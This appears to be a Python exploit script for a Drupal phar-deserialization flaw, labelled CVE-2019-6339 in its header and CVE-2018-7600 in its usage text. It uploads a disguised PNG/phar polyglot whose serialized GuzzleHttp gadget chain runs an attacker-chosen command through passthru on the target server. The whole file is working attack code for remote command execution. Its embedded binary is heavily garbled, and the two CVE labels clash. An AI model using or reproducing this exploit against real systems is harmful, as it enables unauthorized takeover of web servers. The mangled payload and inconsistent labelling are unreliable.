# -*- coding:utf-8 -*-
'''
CVE-2019-6339
writen by ophxc
'''

import argparse
import requests

parser=argparse.ArgumentParser(description="usage of CVE-2018-7600")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute",required=True)
args=parser.parse_args()

url=args.url
command=args.command

file={
    'files':('test.png','''??鷛t                                                                                            0000666                 00000000004 13370421454 0007464 0                                                                                                    ustar 00                                                                                                                                                                                                                                                       test                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            .phar/stub.php                                                                                      0000666                 00000000035 13370421454 0007247 0                                                                                                    ustar 00                                                                                                                                                                                                                                                       <?php __HALT_COMPILER(); ?>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   .phar/.metadata.bin                                                                                 0000000                 00000000601 00000000000 0010024 0                                                                                                    ustar 00                                                                                                                                                                                                                                                       O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:" GuzzleHttp\Psr7\FnStream methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:" GuzzleHttp\HandlerStack handler";'''+"s:"+str(len(command))+":"+command+'''\";s:30:" GuzzleHttp\HandlerStack stack";a:1:{i:0;a:1:{i:0;s:8:"passthru";}}s:31:" GuzzleHttp\HandlerStack cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}                                                                                                                               .phar/signature.bin                                                                                 0000666                 00000000034 13370421454 0010253 0                                                                                                    ustar 00                                                                                                                                                                                                                                                             盅Pi孠╛8?跴勬廔                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ?JFIF   ` `  ?狤xif  MM *                  V       ^(       1       f噄       x       `      `   Adobe ImageReady   ?       ?       茽       ?   ?8Photoshop 3.0 8BIM      8BIM%     ?屬??閫	橃鳥~? ??" ?          	
??   } !1AQa"q2亼?#B绷R佯$3br?
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz儎厗噲墛挀敃枟槞殺￥ウЖ┆渤吹斗腹郝媚牌侨墒矣哉肿刭卺忏溴骁栝犟蝮趱鲼??       	
??  w !1AQaq"2?B憽绷	#3R?br?$4??&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz們剠唶垑姃摂晼棙櫄ⅲぅΗī炒刀犯购旅呐魄壬室釉罩棕仝忏溴骁栝牝篝貊鼬?C 















?C
		


吖














































? 
?  ? ( ( 鈢s?吝4宽oj1貴?E麋潎鹋鍦?@牢I氌?瓃姇笽鞉籫>+G
JU?Q剈m?曩踂!庀?乐遤駈砳??恲??\? ?5?雎駨堔];繯i泥\0Y/鋉v?息e圇脘K臌齊頚齆鎘哗泃揘?庌I'阫鮈撀糢dS鰇鵙铲綏鈤霓;`p襱rj^諯鞪?%馣 %?I糩鹟x7Ng佛~弚??Y纝
孖#b╧巛{銮?]+?FN妋砑?鱧啈I?镇?鶱€?*V牑撄焷k獐銢?羦傚吠{遻g_?j肱跉n蝵?賨鷜1鳺/7寞埛g馰?灛鷯?弒%qTW裄拾T诈褗魥_◎耻食姝垳煖? 6wV?>%賿志,??煸nt?se褵磫叟Wr€z],W@踵缈?ⅵ禥仾璙?琒?民i噟?5"%??~诳打戻僊觰x楋2芜?f?吆?? ??|タ垼火砻`?裮撠K-谆F＿域畩鶞妹虛潻r>駐?_侖笹嫾M乲毧祻i:K &?|碷C?婈^??G?2g?H?EkW嗲嘃Y鈅邖S满澪檙1椃惁?88鯼E}琉况蝡裪_-AS?瓕x#郶炬 =捒1蟶0轻S珌椀弇l﨨礼砑/銅W彃秦M踅帼{擎橗⒉碝wF??碃^哩X?严n釪oQ懶巹A鄬汁~e8Jp毘G韙闎?榛ИkT聤(?( ( 旋? 鳾鰬_B掔? 没琷HZ-KR? 潜40燍胭軁蝺缟_c$锐Y?ap玘]啧躆镍?,v:V[$窊鞐羘坞銦?:3鴊聗V┾0
菼輒dO 腉C鶍鈕鴩?稼飰??4?p;*亝E旲艾&fv.涑1?扞頸谍-脇)偵閞蠾涋Ow﨣孙辉??<谈娍6&\磽鱜?胼晼丒W?QE QE QE QE QE zG?娹3鳾獚G瞒卆v媸\江??9??;齔鳦窕聼t旺k}媁稝讂d?宾.噺2<鬬 憻炮中踺_?刀粻萆ef釮g堘懞}#? 侫*喱&qM詩洮稐)w^{罏%c鴝&阛摒oo8v~[>宏縷ǒ?|z?-i_贇棗g鈑僝[?? 	$n^∣pA膣?藂D案?兆t??&蝡櫘?薿?旬??@(妖奷侰YU蕽r嗢HI響烸@3錈?愠|?蚁傸->?闝4葉kg??熈軫[兎?朙天]蒮c扥$撥阻讏?c-W?蒿坲?低3O<鮢??  c ? 燥 敓鳾坸c'?腲oY>I? ?桹髄銥鉵"蘣姪劦5????w?-?>璇蠴鴄?鷿 驌 輸? 燥 敓 垏眠? 捪 ?3??﨩O ?>璇蠴鴄?鷿 驌 輸? 燥 敓￣"蠫﨣?﨑??駑?漪 ?箢婟 ? ┻ )?G?燒N 鵌 钍??瘅?涑 銫??﨩O ?>璇蠴鴄?鷿 驌 輸? 燥 敓￣"蠫﨣?﨑??駑?漪 ?箢婟 ? ┻ )?G?燒N 鵌 钍??瘅?涑 銫??﨩O ?>璇蠴鴄?鷿 驌 輸? 燥 敓￣"蠫﨣?﨑??駑?漪 ?箢婝螂?当禆鲼签胶4菜.?e櫂轥 I=+? X铓n穟a彷I鮷痮鯻?XDd悈'铄睩	 ?湥?煲R?.抇6掶^缥?f?a<覓?撄(苫y谵fQ^狎媲圂齙纶艇?棿勘擪╬C膖*脝S?A嘧鞐羙?g畔乾?
J譴:暍燉3銌\箦蓚葃瞍錗~*转|鴿)癍瓔綄凙ㄛ/I鞽嵗浻?沔?鈞邊a涐?逤醹 糊zv3粝??漺|5Gi譤胪+~赒Tt蚃荴迎um2e复絽. ?VH銹拭貎毥_蘎媼q捳跴渆(沪QE"?引癸x?唁Qz?2#?f?TaC1$灻撺y?熈?? 锱? .U嵞泌a枋Q陉-V7=藀u=?J状?粀砶C躧? 啌? CU魁 鉚肐? —唼黒癃? W驩?? €K鼛O醴# 犣_?鎨?徇鹨?鑚? ?黬忴i???[ 邒怇5G??O?_?雗G A纯餯?眺+每幛?姓o ~.?鹨?鑚? ?黬忰4 爅燌咳?周怇僫嗳欘4W?肐? —唼黒癃?幛?姓o ~.?掰i @????? 翋 3躧? 啌? CU魁 鉚肐? —唼黒癃?拯誉仾?   [r??? ?秆^;鳤甹v?撯(oeH ?.<巔爚?炵佫綂竡XNㄢi? 2k?,g兤畔V5萜JV醭aU町璴me浇?穪Ye晜""?  $簪觋制諿圪RxYX"" ?1?扥J縣堊R鳮翿?侎$?鷥♂榩D 將縴估_o唜g溾}? ?tK鮫氥^5羛??弞ぞu擙? 6??鰥壶島/劶%+玲?H2彣:?B?膑洔??鷚)蕄賜8\,m鞣蓣o?象黱s崬?>i祟K館瓍Q^戔?Q@＿睏闹詔哯汳
y︻<沢o逥?霚?N鯶?>x齐?7腰]i笣:錨T^睝?? 崣}硽郴对- 砍怟osM嬔銗V?k奶峘?嫟?? 鬯恹魚瓱貇
??澿+;浴e?瘕謖鬑矱W骁歆欲囫s$>??揢筤鳿?郔楍?k?趮?i?绝t?O嬀?c?黪灳|?酥%糜懂<现Z?窿$f?釲]k?8/H{繊淁?Q_P|8QE QE QE QE{里厳_黶m⒉洪v腹早^6[€鰕O式??甛n2?勸5荩w齸GvY梑3U<7溭Izv?O? c邇 e?糀&?:<n9H蜼K?锸!阊伅划lme浇?穪Ye晜""?  $舄葰W圁旹騦4????!_S€▕>€
縣堊R鳮翿?侎$?鷥♂榩D 將縴估_鏙8<f蟑?緫廍纥夯?响<Fa書敏疬Kh桋'諳磡?-]凍婟?]K?	J饃b膾ｊ噯a??坺?~L蕆?[啂E}眵}埝??? 溿g徢蠚r麙钂钘?玜EWPEP_?部嫑臺簇g}?抜Rz韮
?E??_z~脼 h鮛鳸?{{}B$?眾B>綽g??J酥#%旸郸钥G?鼜謡蜑塱裲莴E笋嵕g瑗Q_虶鰕赞裎?x僗f,o礙藢燏k3窢豸J錳物#磼1fbK19$灓焃mhQぉ訊8鞉_q鈑J礩V栻m酔V?EPEPEP婯[涬╨i?$XY萑UU? W鞆羅啔g翢囁m?0呤焟謓贁"?%L?蕝r'y杠k? ?酻?x?~?]4?憋?:閶`坋T?n<笩?鰥壶島/劶%+玲?H2彣:?B?膑洔夀'??阑R︼R]/褃帝縩[熁pB羛朤鴽3W疷5FZ?$幾姘~裚碪啄k﹟%?^@鴴A攠A叙?"FQ_架?蓵,Ou<v盅汲L?q匹澼??扥 I?OI嚨刪貹"霐度8iB澮濨?r療妓0<當0Uo枉擖.鞆鼠甲1?s\l縀?黮费氛淓Q^馏PEPEP_N~葰櫚aj?磍痬徃X跳? L}:鱋佶??dbはp?峬(#?狁5%S(臙 $?秨?Wt竷8 县~2I?欹Q_如?摘桉籊"昬$2憘?酽譙銤1確膪;e猑[阌蕶自鷝氬B峌R渏Gf擕象wFTj蕦穻k顅
(⒋1
(
(
??给夆藑蝃K暜??c幢嚈efn??戠曍 耏qa醀饢嫑x/輌說Ix樘Q1 嚚O鈘\珏菐U錓??? 椣屋Wn梜咽?5誠b?珚轢夣}憝擌 ?Kg胦嘕t??栬#?鲹鲁g?#*?;髝?A鱏莔m?伪?jY葚?伾$?錃 倇┿抖嶅歡X銕5,铎p@鋻x rM~潂? 出濔薒?>!垪Z?窽槂?ゝf=<砉茌d潼謅榚?棬A^Oe雩.忘桪}甋旀躮??h玸J謪8-?膊鴆譿諡EⅧO龤?~%(?q?僀眪畺瓤??懇茼褁@r臒塶铑o铈窘曠腹戝歐;濅rY檳闕$揯柜蒜プ?\k*魏U慈崠陗?濻?q落?鉼呙?M:O弚疭Yut傡ｙ鄂<??uk?蕰按n＾o鞹梬+i?$柫EW?QE QE QE 顭矹<?<*ē垶岚=赗O?k码橄?L7 ?€霄u曧肾
?榉絰|MUS?R??O罷^ 罛?篥創侜貳W??主_趦@:茲x*韲Q0吲?y癞? C紫怔鹥xI?$!揔筶t3A繕z嗵羉2\=^?:~6刻??)yb枸II蛕O撄/o怮E?脜Q@Q@K軴荡o,??qゞwc€?$摾抙?瞌広?杋漜?猿槐繳扞??鷩?~蜳x|i鉎R_虥?歾0麬湉驾p;擉糑母l?慝k'鹎?㈩ [#?3?糋峏l2??慱珆_$汫戾?A?!瘰?I|G2n贩l2i杳?r>髏A李O鸻|`?狐)瘘鴸p砶2!罤?+|庯酶蜒埊/麷誉?竽譡$?劝穋榱馗氲pY顸 髋~+贲梲苇;\捱L?? y鋹朾{rOA理_沺^炴2蟬-c町楅e?煗腺麳桶\/撁叢U?蹂{?鏋轖翰V3琚婟h
(
(
(
(
?瘥>р亨C緹c尣 }即显W罸?鳫鳺圉?刹鏪扢V_鱣旅?Q闙~鈄`谤,┻Z岹?偡听g羭モ鴸汍iFRw*黣戶eQ_蚲鰕缠洁u鴫痣Z皙€nn 2Z陉$嫓??烞k?H鋯F唀dtb0拭?<?@爹G鸜?o糞稪?k尐鵦?胗踶"A灔?縛皈<T隩赎?颎課緆_扅蹉?:貁Y??? 吙u鼪k]彅琚婟玄\
(
?'簽;kh轞?鉘晤?TI'€$?軴荡o,??qゞwc€?$摾択?鰎郎狆茞ぞ#?[鄱4鬭鴥9y?鄔'鐇棄p?踁諳釓V E蔺禛豴gcx?柏eh/巬"縑?綢6徺琐r兝pC鉕B掵巇輔n豥友団鋧骅儊軣?⒖榮屻欌e娕J?r]棐?穢{嚢Y.
8m鞣辗湛??p?鴊??j?矣S6A鸥扽Qc??FN褤岏\O?g??m 稞? 痲ⅵ唖彙J峺?dひ麚+霉N&壜訙揞P媜Ν珵 兖C[? q 莌 唋? B? ? 愕?V唠i A5??檱? ?/??;?赤圐
? 齄? 幯 兖C[? q 莐躧｝`??/?鮇# ?_?鋢w?g??m 稞? ￣赤圐
? 齄? 幾秆G?蠱O?_?陽G @T筐\?瑞秫f蟼?? 啕怇;G?g??m 稞? 痲鮾4 牃燌刻??怇€?喔戓唣蜔?鑅? 亏黺忴f蟼?? 啕怇;^鉋?i A5???猋?R 羛 #每釠>蝎o ?{Mキ綅?Vq?[票E?" 獱z 0*?蓨蘱x&m工菥鑫?O€?餞!M靳b?[%p+堲O旋:痫M喃?_晭IW统?&揸<樹跗~V拕庻璐V鳿ML=h注?从驡.7G嚍hM4譼?谍U鹌祔猃n毒皺&戡緡簯蕬?连婟M?i嚻?僿坱璞4}l冾€93 麧貄絭泸褧憡8*蕄A鄠;醤#`晉i5g﨩?
q?b8w1?Υ薨梮 氋癁?+??涏缒??珍?♂鳫5E馕i/E紇爩3$g?浰p8 rO舆疠燉$錥 鸽箢婛?溌恐1敎ミ?俁铲#?_s皔uu-l犏垛踾佚 嗢 ? *啐荊?g齀鵙 ?⒓ 鴩? @ ? ?? 埥胚? 扴 ?蠴鴑销?颦 躷胿詰 昽? 坹眠? 揙 ?鴭躚 A??兀? 嗢 ? *啐荊?g齀鵙 ?鴩? @ ? ? 埥胚? 扴 ?蠴鴑销?颦 躷胿詰 昽? 坹眠? 揙 ?鴭躚 A??兀? 嗢 ? *啐荊?g齀鵙 ?鴩? @ ? ? 埥胚? 扴 ?蠴鴑销?颦 躷胿詰 昽? 坹眠? 揙 ?鴭躚 A??兀? 嗢 ? *啐荿燄楒氈>-x?
i??
?彘约亩厁躓飓箼蔼粏I?$~b鴞铭繆但?h6蟱}*?I员頞EU? 抪+鯧嗲聖/?刢裮娤ㄝm汻?櫑禽^y*冴z悲夈l泧2|'-*緹鹿Ё鳠讲檩鵟?肗#?!求着?玈~Ο?騨e俚]+馽鶯( 妖? 瘏i侃登锅侌钭:?.＆?沅瀂hW鱰?瞠+厝筇VU奨?转枳g齢|?鹌=浪帊珠唣kF?,瑢Q罺S?赜k鮟銦烨｜E3鴽翭-/膌7Hу督# ?骼瑛侁?1糓醥?W汢?勞}?鎶e艷fR2? ??脇W偽)sPv氜/u蛗?q?鎈;_?jM_蹯鼰孰S?>$( ( ( ( ( +_A衭牿?僰%睚靷8`宔檹?抪 ?峥聫|S誇濁?aF骣lキ?蒺y荅PX??玙>	xS?榗覹砗德荚%摗貎?,寘??|_q?'﹂朋謠G窚?-哜縄郞
q麮UU抰痖?资邽水?g?繻7?朂ォl获5鬉n?攣??伖汗€ }E檉X寏"X琓?V]掕忟紱&耬X8`p0濮楁遶+匁??引? ( ????K駐?靕?縭x r.OL屶銗G垩[P腢U?-歷h缗a(鈏J?
P枍5t齋?/~%?疸栓?_鳫t郔矶;携	.=S筥"_X_閣rXjv覼]B踕唗h鬳`?Q_康区忱裾暗駈峣┆?虩紷?釪 €隘?O1TRC?2襙5滁赂浝?%嘿5_e/鍟軂O鈴﨤~裚?-龎?ǔ躼?X谎澆D
/ 丯c慓筭5箢禁|\宜6朂潿?L剓茽?弞?枪)+WQ}ヮ?O狞c5皤夝-?婊馏_浣锝#?+譽/€?4⑺u?M鲧?f嬳]=<債?棝岑腫yS鳺[嵡U}:酘媳幘姈k偍疦確齇惌慺T_-l<恻?姠猾o? ?[_	霌`€vi?zd堷黭惨 g?峑?m醄竵=n?P:騶鏑埸銽滞?曣讉鯍_﹛~?枂? $x??嚳b瘓趤I<A﹊篋M鲿Y瞌_?镥}? 仉釒€R隳R]鴬醦J? g度?垎胭黼?噲y&;U鐌?韗?笡?e髒?楟J~fxk聗%駧牶W咊蹪N桡)o}狑v眷@~/?[猊?肐瞸缵y顷眊匐?A?9b歡囲-措D錫祲a?籘 I顉氈s?聒撮`c欤遹}?捒欫o?昤$r鲶]-h/栻??碝F疝?崰YAж蹗绷n?_S佋灓濱錅汁W鍿湩'9欢~譔?罛毑Z$碒(捖?????''')}

headers={
'Host': url,
'Accept':'*/*',
'Accept-Language':'en',
'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
'Connection':'close',
'Content-Type': 'application/'
}

url="http://"+url+"/sites/default/files/styles/thumbnail/public/pictures/2021-01/"

proxy = {
    'http': '127.0.0.1:8080'
}

res=requests.post(url=url,files=file,headers=headers,proxies=proxy)